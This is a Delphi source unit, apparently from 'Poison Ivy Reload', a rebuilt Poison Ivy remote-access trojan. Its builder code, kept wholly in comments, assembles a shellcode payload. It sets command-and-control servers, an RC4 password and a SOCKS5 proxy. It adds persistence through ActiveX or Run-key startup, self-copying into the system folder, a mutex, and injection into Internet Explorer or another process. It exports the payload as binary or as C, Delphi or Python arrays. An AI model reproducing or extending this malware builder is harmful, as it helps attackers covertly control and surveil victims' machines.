unit UnitBuilder;

interface
uses
  Winapi.Windows, System.Classes, System.SysUtils;
{
type
  TBuilder = class
  private
    FShellData, FShellCode: TMemoryStream;
  private
    procedure WriteOffset(w: Word);
    procedure WriteAnsiString(s: AnsiString);
    procedure WriteWideString(s: WideString);
    procedure WriteWord(w: Word);
    procedure WriteByte(b: Byte);
    procedure WriteBoolean(b: Boolean);
  public
    constructor Create(); overload;
    destructor Destroy(); overload;
  public
    procedure WriteDNSList(s: string);
    procedure WriteID(s: AnsiString);
    procedure WritePassword(s: AnsiString);
    procedure WriteSocks5(dns, username, password: AnsiString; port: Word);
    procedure WriteStartUp(isAcitvex: Boolean; s: string);
    procedure WriteInstallation(copy_to_system: Boolean; filename: string);
    procedure WriteMutex(s: AnsiString);
    procedure WriteInject(inject_to_ie: Boolean; filename: string);
    procedure WriteConfigEnd();
    function SaveToBinary(filename: string): Boolean;
    function SaveToCArray(filename: string): Boolean;
    function SaveToDelphiArray(filename: string): Boolean;
    function SaveToPythonArray(filename: string): Boolean;
  end;
}
implementation
uses
  UnitShellCodes;

{ TBuilder }

//constructor TBuilder.Create();
//begin
//  FShellData := TMemoryStream.Create;
//  FShellCode := TMemoryStream.Create;
//  // 首先写入shellcode主体
//  FShellData.Write(PAnsiChar(get_loader_main_ptr())^, get_loader_main_size());
//end;
//
//destructor TBuilder.Destroy;
//begin
//  FreeAndNil(FShellData);
//  FreeAndNil(FShellCode);
//end;
//
//function TBuilder.SaveToBinary(filename: string): Boolean;
//var
//  fs: TFileStream;
//begin
//  Result := True;
//  if FShellCode.Size <> 0 then
//    FShellData.Write(PAnsiChar(FShellCode.Memory)^, FShellCode.Size);
//
//  fs := TFileStream.Create(filename, fmCreate);
//  try
//    fs.Write(PAnsiChar(FShellData.Memory)^, FShellData.Size);
//  except
//    Result := False;
//  end;
//  FreeAndNil(fs);
//end;
//
//function TBuilder.SaveToCArray(filename: string): Boolean;
//var
//  temp: string;
//  ss: TStringStream;
//  i: Integer;
//begin
//  Result := True;
//  if FShellCode.Size <> 0 then
//    FShellData.Write(PAnsiChar(FShellCode.Memory)^, FShellCode.Size);
//
//  ss := TStringStream.Create();
//  try
//    temp := Format(
//      '// Generated by Poison Ivy Reload 0.0.1' + #13#10 +
//      '// http://www.github.com' + #13#10 +
//      '// Length: 0x%.8x (bytes)' + #13#10 +
//      'unsigned char PIshellcode[%d] = ' + #13#10 +
//      '{' + #13#10#09,
//      [FShellData.Size, FShellData.Size]);
//    ss.WriteString(temp);
//
//    for i := 1 to FShellData.Size do
//    begin
//
//      if i = FShellData.Size then
//      begin
//        temp := Format('0x%.2x', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//        temp := temp + #13#10 + '};';
//      end else
//      begin
//        temp := Format('0x%.2x, ', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//        if (i mod 16) = 0 then
//          temp := temp + #13#10#09;
//      end;
//
//      ss.WriteString(temp);
//    end;
//
//    ss.SaveToFile(filename);
//  except
//    on e: Exception do
//    begin
//      MessageBox(0, PChar(e.Message), 0, 0);
//      Result := False;
//    end
//  end;
//  FreeAndNil(ss);
//end;
//
//function TBuilder.SaveToDelphiArray(filename: string): Boolean;
//var
//  temp: string;
//  ss: TStringStream;
//  i: Integer;
//begin
//  Result := True;
//  if FShellCode.Size <> 0 then
//    FShellData.Write(PAnsiChar(FShellCode.Memory)^, FShellCode.Size);
//
//  ss := TStringStream.Create();
//  try
//    temp := Format(
//      '// Generated by Poison Ivy Reload 0.0.1' + #13#10 +
//      '// http://www.github.com' + #13#10 +
//      '// Length: 0x%.8x (bytes)' + #13#10 +
//      'PIshellcode: array[0..%d] of byte = ' + #13#10 +
//      '(' + #13#10#09,
//      [FShellData.Size, FShellData.Size]);
//    ss.WriteString(temp);
//
//    for i := 1 to FShellData.Size do
//    begin
//
//      if i = FShellData.Size then
//      begin
//        temp := Format('0x%.2x', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//        temp := temp + #13#10 + ');';
//      end else
//      begin
//        temp := Format('$%.2x, ', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//        if (i mod 16) = 0 then
//          temp := temp + #13#10#09;
//      end;
//
//      ss.WriteString(temp);
//    end;
//
//    ss.SaveToFile(filename);
//  except
//    on e: Exception do
//    begin
//      MessageBox(0, PChar(e.Message), 0, 0);
//      Result := False;
//    end
//  end;
//  FreeAndNil(ss);
//end;
//
//function TBuilder.SaveToPythonArray(filename: string): Boolean;
//var
//  temp: string;
//  ss: TStringStream;
//  i: Integer;
//begin
//  Result := True;
//  if FShellCode.Size <> 0 then
//    FShellData.Write(PAnsiChar(FShellCode.Memory)^, FShellCode.Size);
//
//  ss := TStringStream.Create();
//  try
//    temp := Format(
//      '# Generated by Poison Ivy Reload 0.0.1' + #13#10 +
//      '# http://www.github.com' + #13#10 +
//      '# Length: 0x%.8x (bytes)' + #13#10 +
//      'PIshellcode = \' + #13#10 + '''',
//      [FShellData.Size]);
//    ss.WriteString(temp);
//
//    for i := 1 to FShellData.Size do
//    begin
//
//      if i = FShellData.Size then
//      begin
//        temp := Format('\x%.2x''', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//      end else
//      begin
//        temp := Format('\x%.2x', [DWORD(PAnsiChar(Integer(FShellData.Memory) + i - 1)^)]);
//        if (i mod 16) = 0 then
//          temp := temp + ''' + \'+ #13#10 + '''';
//      end;
//
//      ss.WriteString(temp);
//    end;
//
//    ss.SaveToFile(filename);
//  except
//    on e: Exception do
//    begin
//      MessageBox(0, PChar(e.Message), 0, 0);
//      Result := False;
//    end
//  end;
//  FreeAndNil(ss);
//end;
//
//procedure TBuilder.WriteAnsiString(s: AnsiString);
//var
//  tmp: Word;
//begin
//  tmp := Length(s) * SizeOf(AnsiChar);
//  FShellData.Write(tmp, SizeOf(tmp));
//  FShellData.Write(PAnsiChar(s)^, tmp);
//end;
//
//procedure TBuilder.WriteBoolean(b: Boolean);
//var
//  byt: Byte;
//  tmp: Word;
//begin
//  byt := 0;
//  if (b) then byt := 1;
//  tmp := 1;
//  FShellData.Write(tmp, SizeOf(tmp));
//  FShellData.Write(byt, SizeOf(byt));
//end;
//
//procedure TBuilder.WriteByte(b: Byte);
//var
//  tmp: Word;
//begin
//  tmp := 1;
//  FShellData.Write(tmp, SizeOf(tmp));
//  FShellData.Write(b, SizeOf(b));
//end;
//
//procedure TBuilder.WriteConfigEnd;
//begin
//  WriteOffset(0);
//end;
//
//procedure TBuilder.WriteDNSList(s: string);
//var
//  sl, sl2: TStringList;
//  i: Integer;
//  ans: AnsiString;
//  port, w: Word;
//  ms: TMemoryStream;
//begin
//  WriteOffset(get_server_list_offset());
//
//  if s <> '' then
//  begin
//    sl := TStringList.Create;
//    sl2 := TStringList.Create;
//    ms := TMemoryStream.Create;
//    try
//      sl.Delimiter := ',';
//      sl.DelimitedText := s;
//
//      for i := 0 to sl.Count - 1 do
//      begin
//        sl2.Delimiter := ':';
//        sl2.DelimitedText := sl.Strings[i];
//
//        ans := sl2.Strings[0];
//        port := StrToInt(sl2.Strings[1]);
//
//        // write ip
//        ms.Write(PAnsiChar(ans)^, Length(ans) + 1);
//        // write port
//        ms.Write(port, SizeOf(port));
//      end;
//
//      // write total len
//      w := ms.Size;
//      FShellData.Write(w, SizeOf(w));
//      FShellData.Write(PAnsiChar(ms.Memory)^, ms.Size);
//    finally
//      FreeAndNil(ms);
//      FreeAndNil(sl);
//      FreeAndNil(sl2);
//    end;
//  end;
//end;
//
//procedure TBuilder.WriteID(s: AnsiString);
//begin
//  WriteOffset(get_id_offset());
//  WriteAnsiString(s);
//end;
//
//procedure TBuilder.WriteInject(inject_to_ie: Boolean; filename: string);
//begin
//  FShellCode.Write(PAnsiChar(get_injecter_ptr)^, get_injecter_size);
//  FShellCode.Write(PAnsiChar(get_create_ie_process_ptr)^, get_create_ie_process_size);
//  if not inject_to_ie then
//  begin
//    FShellCode.Write(PAnsiChar(get_find_process_by_name_ptr)^, get_find_process_by_name_size);
//  end;
//
//  if inject_to_ie then
//  begin
//    WriteOffset(get_inject_to_ie_offset);
//    WriteBoolean(True);
//  end else
//  begin
//    WriteOffset(get_inject_to_process_offset);
//    WriteBoolean(True);
//    WriteOffset(get_inject_process_name_offset);
//    WriteWideString(filename);
//  end;
//end;
//
//procedure TBuilder.WriteInstallation(copy_to_system: Boolean; filename: string);
//begin
//  FShellCode.Write(PAnsiChar(get_copy_self_ptr)^, get_copy_self_size);
//
//  WriteOffset(get_copy_method_offset);
//  if copy_to_system then
//    WriteByte(COPY_METHOD_TO_SYSTEM)
//  else
//    WriteByte(COPY_METHOD_TO_WINDOWS);
//
//  WriteOffset(get_copy_to_offset);
//  WriteWideString(filename);
//end;
//
//procedure TBuilder.WriteMutex(s: AnsiString);
//begin
//  WriteOffset(get_mutex_name_offset);
//  WriteAnsiString(s);
//end;
//
//procedure TBuilder.WriteOffset(w: Word);
//begin
//  FShellData.Write(w, SizeOf(w));
//end;
//
//procedure TBuilder.WritePassword(s: AnsiString);
//begin
//  WriteOffset(get_rc4_key_offset());
//  WriteAnsiString(s);
//end;
//
//procedure TBuilder.WriteSocks5(dns, username, password: AnsiString; port: Word);
//begin
//  FShellCode.Write(PAnsiChar(get_connect_server_by_socks5_ptr)^, get_connect_server_by_socks5_size);
//
//  // write connect method
//  WriteOffset(get_connect_method_offset);
//  WriteByte(CONNECT_METHOD_SOCKS5);
//
//  // write dns
//  WriteOffset(get_socks5_server_offset);
//  WriteAnsiString(dns);
//
//  // write port
//  WriteOffset(get_socks5_port_offset);
//  WriteWord(port);
//
//  // write username
//  if username <> '' then
//  begin
//    WriteOffset(get_socks5_username_offset);
//    WriteAnsiString(username);
//  end;
//
//  // write password
//  if username <> '' then
//  begin
//    WriteOffset(get_socks5_password_offset);
//    WriteAnsiString(password);
//  end;
//end;
//
//procedure TBuilder.WriteStartUp(isAcitvex: Boolean; s: string);
//begin
//  WriteOffset(get_startup_method_offset);
//
//  if isAcitvex then
//  begin
//    FShellCode.Write(PAnsiChar(get_startup_activex_ptr)^, get_startup_activex_size);
//
//    WriteByte(STARTUP_METHOD_ACTIVEX);
//  end
//  else
//  begin
//    FShellCode.Write(PAnsiChar(get_startup_current_run_ptr)^, get_startup_current_run_size);
//
//    WriteByte(STARTUP_METHOD_CURRENT_RUN);
//  end;
//
//  WriteOffset(get_startup_name_offset);
//  WriteWideString(s);
//end;
//
//procedure TBuilder.WriteWideString(s: WideString);
//var
//  tmp: Word;
//begin
//  tmp := Length(s) * SizeOf(WideChar);
//  FShellData.Write(tmp, SizeOf(tmp));
//  FShellData.Write(PWideChar(s)^, tmp);
//end;
//
//procedure TBuilder.WriteWord(w: Word);
//var
//  tmp: Word;
//begin
//  tmp := SizeOf(w);
//  FShellData.Write(tmp, SizeOf(tmp));
//  FShellData.Write(w, SizeOf(w));
//end;

end.
